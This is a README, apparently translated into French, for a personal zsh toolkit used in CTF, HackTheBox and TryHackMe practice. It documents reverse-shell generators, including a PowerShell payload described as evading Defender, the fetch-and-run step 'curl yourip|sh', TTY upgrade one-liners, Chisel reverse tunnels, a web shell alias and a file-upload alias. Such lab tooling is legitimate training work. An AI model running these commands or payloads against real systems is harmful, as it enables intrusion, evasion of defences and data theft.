# Trucs pour CTFs, HTB, THM etc
Contient des alias et des scripts que j’utilise souvent. Clonez simplement ce dépôt **dans votre dossier personnel** et exécutez `echo "source ~/zsh-aliases/aliases.zsh" >> ~/.zshrc`. Après avoir redémarré zsh, vous devriez pouvoir utiliser tous les alias et scripts. Testé uniquement sur Kali Linux, vous pourriez avoir besoin d’installer des dépendances supplémentaires sur d’autres distributions. 
> #### Avertissement
> La plupart de ces alias sont probablement nuls, n’hésitez pas à soumettre une demande de tirage pour réduire le côté pepegan. Pour moi, le fait que ça fonctionne suffit pour les utiliser pour l’instant :D
## Divers
### > www

Démarre un serveur HTTP sur le port 80 dans le répertoire courant. Affiche également une liste des adresses IP associées à chaque interface réseau, montre le chemin du répertoire courant et liste les fichiers. 
Exemple :
```
┌──(jazz㉿kali)-[/tmp/www]
└─$ www
[eth0] 192.168.172.128
[/tmp/www]
linpeas.sh  pspy64
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
> #### Notes
> - Sudo est utilisé pour garantir la possibilité d'écouter sur le port 80

### > tun0

Copie l'adresse IP de l'interface tun0 dans le presse-papiers. 
Exemple :
```
┌──(jazz㉿kali)-[~/jazz]
└─$ tun0 
```
Contenu du presse-papiers après :
```
10.10.14.41
```

### > mkdir_cd
Souvent, lorsque je crée un répertoire, je veux directement y `cd` par la suite. Ceci fait exactement cela.  
Exemple : 
```
┌──(jazz㉿kali)-[~/jazz]
└─$ mkdir_cd pepega

┌──(jazz㉿kali)-[~/jazz/pepega]
└─$ 
```

## Shells inversés
### > gen_lin_rev $ip $port 
Basé sur [RSaaS](https://github.com/lukechilds/reverse-shell). Crée un fichier appelé `index.html` dans le répertoire courant. Ce fichier contient plusieurs charges utiles de shell inversé qui seront tentées en séquence jusqu'à ce qu'une fonctionne. Peut être utilisé avec `www` pour rendre la génération d'un shell inversé après obtention d'une RCE extrêmement facile et rapide. Il suffit de faire exécuter au cible `curl votreip|sh` et il récupérera la charge utile du shell inversé depuis votre serveur web et -espérons-le- se connectera à votre écouteur. 
Exemple :
```
┌──(jazz㉿kali)-[~]
└─$ gen_lin_rev 127.0.0.1 1337
[+] Wrote Linux reverse shells to /home/jazz/index.html
```
> #### Notes
> - J'aime vraiment la façon dont la charge utile `curl yourip|sh` ne contient presque pas de caractères interdits à part peut-être l'espace et le pipe. Lorsque les espaces posent problème, il existe [des moyens de contourner cela](https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions#bypass-forbidden-spaces) et le pipe peut être contourné en téléchargeant et en exécutant séparément.
> - Si curl n'est pas installé sur la machine distante, vous pouvez essayer `wget yourip -O-|sh`
 
### > gen_php_rev $ip $port

Génère le [PentestMonkey PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell) avec l'ip et le port fournis et le sauvegarde dans le répertoire courant.  
Exemple :

```
┌──(jazz㉿kali)-[~]
└─$ gen_php_rev 127.0.0.1 1337                                                              
[+] Wrote PHP reverse shell to /home/jazz/jazz.php
```
### > gen_ps_rev $ip $port
Génère un shell inverse Powershell avec l’IP et le port fournis, qui au moment de la dernière utilisation contournait Defender. Je ne sais pas à qui attribuer ce payload. 
Exemple :
```
┌──(jazz㉿kali)-[~]
└─$ gen_ps_rev 127.0.0.1 1337
```
Contenu du presse-papiers après :
```
powershell -ec JABUAGEAcgBnAGUAdABIAG8AcwB0A...
```

## Mises à niveau TTY
### > uptty
Copie la commande de mise à niveau tty python(2) et python3 dans le presse-papiers. 
Exemple : 
```
┌──(jazz㉿kali)-[~/jazz]
└─$ uptty
```
Contenu du presse-papiers après :
```
python3 -c 'import pty;pty.spawn("/bin/bash")';python -c 'import pty;pty.spawn("/bin/bash")'
```
> #### Notes
> - Nécessite que `xclip` soit installé
> - `py_tty_upgrade` et `py3_tty_upgrade` sont encore inclus pour le moment mais appelleront cet alias à la place

### > script_tty_upgrade
Lorsque Python n'est pas installé sur la machine distante, vous pouvez utiliser cette commande pour copier la méthode `script` afin de passer à un shell tty dans votre presse-papiers. 
Exemple : 
```
┌──(jazz㉿kali)-[~/jazz]
└─$ script_tty_upgrade
```
Contenu du presse-papiers après :
```
/usr/bin/script -qc /bin/bash /dev/null
```
> #### Notes
> - Nécessite que `xclip` soit installé

### > tty_fix
Exécute `stty raw -echo; fg; reset` qui doit être utilisé après avoir appliqué l’une des améliorations tty ci-dessus.

### > tty_conf
Récupère les paramètres tty actuels (nombre de lignes et de colonnes) et copie un one-liner dans le presse-papiers qui peut être collé directement dans votre fenêtre de shell inverse pour que ces paramètres correspondent. Cela résout le problème de retour à la ligne qui se produit au milieu de votre terminal.  
Exemple :
```
┌──(jazz㉿kali)-[~/jazz]
└─$ tty_conf               
```
Contenu du presse-papiers après :
```
stty rows 30 columns 116
```
> #### Notes
> - Nécessite que `xclip` soit installé

## Casse de hachage
### > rock_john $fichier_hash (arguments supplémentaires)
Au lieu de fournir manuellement rockyou comme argument avec `--wordlist=/usr/share/wordlists/rockyou.txt` (sans auto-complétion :/) cet alias injecte cet argument et peut donc être utilisé pour tenter de casser un hachage avec JohnTheRipper et la liste de mots rockyou plus facilement. 
Exemple :
```
┌──(jazz㉿kali)-[~/jazz]
└─$ rock_john hash.txt --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
jazz             (?)     
1g 0:00:00:00 DONE (2022-05-19 15:59) 100.0g/s 5376Kp/s 5376Kc/s 5376KC/s lynn88..ilovebrooke
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```
> #### Notes
> - Kali semble avoir corrigé l'auto-complétion pour John dans la version 2022.2 ! Cet alias vous fait quand même gagner un peu de temps ;)
## Scan de ports
### > nmap_tcp $ip (arguments supplémentaires)
Lance un scan TCP avec nmap en utilisant mes paramètres par défaut et enregistre les résultats du scan dans un répertoire nmap qui est créé automatiquement s'il n'existe pas encore. 
Exemple :
```
┌──(jazz㉿kali)-[~]
└─$ nmap_default 127.0.0.1
[i] Creating /home/jazz/nmap...
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-19 16:04 EDT
...
```
> #### Notes
> - Cela ne scanne que les ports TCP par défaut. Ajoutez `-p-` comme argument pour scanner tous les ports.
> - Utilise `sudo` pour obtenir les privilèges nécessaires à un scan SYN
### > nmap_udp $ip (arguments supplémentaires)
Lance un scan UDP nmap avec mes paramètres par défaut et enregistre les résultats du scan dans un répertoire nmap qui est automatiquement créé s'il n'existe pas encore.
Exemple :
```
┌──(jazz㉿kali)-[~]
└─$ nmap_udp 127.0.0.1
[i] Creating /home/jazz/nmap...
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-19 16:11 EDT
...
```
> #### Notes
> - Cela ne scanne que les ports UDP par défaut. Ajoutez `-p-` en argument pour scanner tous les ports.
> - Utilise `sudo` pour obtenir les privilèges nécessaires à un scan UDP


## Chemin SecLists

> #### Notes
> - De nombreuses fonctions de cette boîte à outils utilisent des listes de mots du projet SecLists. Pour garantir le bon fonctionnement de ces fonctions, les scripts doivent savoir où trouver le répertoire SecLists. La boîte à outils utilise la logique suivante pour localiser SecLists :

1. Tout d'abord, elle vérifie si `/opt/seclists/` existe.
2. Sinon, elle vérifie si `/usr/share/seclists/` existe.
3. Si aucun de ces répertoires n'existe, elle recherche une variable d'environnement appelée `SECLISTS_PATH`.

Pour configurer SecLists pour l'utiliser avec ces scripts :

1. Installez SecLists dans l'un des emplacements standards (`/opt/seclists/` ou `/usr/share/seclists/`).
   
   OU

2. Définissez la variable d'environnement `SECLISTS_PATH` pour pointer vers votre installation de SecLists :

   ```bash
   export SECLISTS_PATH="/path/to/seclists"
   # You can add this line to your .zshrc file to make it permanent.
    ```

## Fuzzing Web
### > vhost $domaine (-w liste_mots) (arguments supplémentaires)
Effectue la découverte d'hôtes virtuels en utilisant ffuf.
Exemple :
```
┌──(22sh㉿kali)-[~]
└─$ vhost box.htb
```
> #### Notes
> - Lorsqu'on ne passe que le domaine, http sera utilisé, vous pouvez cependant aussi passer l'url complète https://box.htb pour https
> - Nécessite que `ffuf` soit installé
### > fuzz_dir $url (arguments supplémentaires)
Effectue un fuzzing de répertoires et fichiers en utilisant ffuf.
Exemple :
```
┌──(22sh㉿kali)-[~]
└─$ fuzz_dir http://box.htb

┌──(22sh㉿kali)-[~]
└─$ fuzz_dir http://box.htb -w /path/to/custom/wordlist.txt

┌──(22sh㉿kali)-[~]
└─$ fuzz_dir http://box.htb -fs 245

┌──(22sh㉿kali)-[~]
└─$ fuzz_dir http://box.htb -w /path/to/custom/wordlist.txt -fs 245
```
> #### Notes
> - Nécessite que `ffuf` soit installé
## Tunneling avec Chisel
### > chisel_socks $ip $port
Configure un proxy SOCKS avec Chisel et copie la commande dans le presse-papiers.
Exemple :

```
┌──(22sh㉿kali)-[~/jazz]
└─$ chisel_socks 10.10.14.10 8888
[+] copied chisel client -v 10.10.14.10:8888 R:socks in clipboard
2024/08/05 23:31:03 server: Reverse tunnelling enabled
2024/08/05 23:31:03 server: Fingerprint vasHkxo+4Ec2ahPgyQ8BNqQVXOCda9cmPmP7WXRdh44=
2024/08/05 23:31:03 server: Listening on http://0.0.0.0:8888
```
### > chisel_forward $local_ip $local_port $remote_ip $remote_port
Configure le transfert de port avec Chisel.
Exemple :

```
┌──(22sh㉿kali)-[~/jazz]
└─$ chisel_forward 10.10.14.10 8080 127.0.0.1 8080
[+] Copied to clipboard: ./chisel client 10.10.14.10:8888 R:8080:127.0.0.1:8080
[+] Run this on the target machine
2024/08/05 23:32:30 server: Reverse tunnelling enabled
2024/08/05 23:32:30 server: Fingerprint x2iuHfzYVOWXL/7Gw0a6AjXhMIg8WP7AqZwlDuRasQw=
2024/08/05 23:32:30 server: Listening on http://0.0.0.0:8888
```
## Gestion des hôtes
### > addhost $ip $hostname
Ajoute ou met à jour une entrée dans le fichier /etc/hosts.
Exemple :
```
┌──(22sh㉿kali)-[~/jazz]
└─$ addhost 10.10.11.234 big.box.htb 
[+] Appended big.box.htb to existing entry for 10.10.11.234 in /etc/hosts
10.10.11.234 boss.htb big.boss.htb big.box.htb


┌──(22sh㉿kali)-[~/jazz]
└─$ addhost 10.10.11.235 newbox.htb 
[+] Added new entry: 10.10.11.235 newbox.htb to /etc/hosts
10.10.11.235 newbox.htb
```
## Alias supplémentaires
- `linpeas` : Télécharge la dernière version de LinPEAS.
- `upload` : Téléverse un fichier en utilisant bashupload.com.
- `phpcmd` : Crée un web shell PHP simple.
- `burl` : curl utilisant le proxy burpsuite.



---

Tranlated By [Open Ai Tx](https://github.com/OpenAiTx/OpenAiTx) | Last indexed: 2026-05-07

---